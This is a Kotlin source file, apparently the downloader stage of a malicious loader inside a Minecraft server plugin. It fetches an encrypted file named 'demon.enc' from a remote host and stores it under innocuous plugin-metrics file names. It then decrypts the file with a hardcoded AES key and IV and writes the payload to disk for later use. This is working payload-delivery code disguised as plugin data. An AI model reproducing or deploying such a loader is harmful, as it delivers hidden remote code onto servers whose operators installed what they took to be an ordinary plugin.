package club.reaper.loader.downloader

import org.apache.commons.io.FileUtils
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.io.InputStream
import java.net.URL
import java.net.URLConnection
import java.nio.file.Files
import java.security.InvalidAlgorithmParameterException
import java.security.InvalidKeyException
import java.security.NoSuchAlgorithmException
import javax.crypto.BadPaddingException
import javax.crypto.Cipher
import javax.crypto.IllegalBlockSizeException
import javax.crypto.NoSuchPaddingException
import javax.crypto.SecretKey
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.SecretKeySpec

class FileDownloader {
    @Throws(
        IOException::class,
        InvalidKeyException::class,
        NoSuchAlgorithmException::class,
        NoSuchPaddingException::class,
        IllegalBlockSizeException::class,
        BadPaddingException::class,
        InvalidAlgorithmParameterException::class
    )
    fun download(): File {
        val file = File("plugins/PluginMetrics/config.dat")
        file.createNewFile()
        val decrypted = File("plugins/PluginMetrics/world.dat.dec")
        val url = URL("https://web8526.phsite.online/api/loader/demon/demon.enc")
        val connection: URLConnection = url.openConnection()
        connection.setRequestProperty("User-Agent", "UltimateTool")
        val `in`: InputStream = connection.getInputStream()
        val fos = FileOutputStream(file)
        val buf = ByteArray(512)
        while (true) {
            val len: Int = `in`.read(buf)
            if (len == -1) {
                break
            }
            fos.write(buf, 0, len)
        }
        `in`.close()
        fos.flush()
        fos.close()
        val cipherBytes: ByteArray = Files.readAllBytes(file.toPath())
        val iv = "RR8zEFCWyuad5uff".toByteArray()
        val keyBytes = "u8S4T6P#t#fWhAGQ".toByteArray()
        val aesKey: SecretKey = SecretKeySpec(keyBytes, "AES")
        val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
        cipher.init(Cipher.DECRYPT_MODE, aesKey, IvParameterSpec(iv))
        val result: ByteArray = cipher.doFinal(cipherBytes)
        FileUtils.writeByteArrayToFile(decrypted, result)
        return decrypted
    }
}
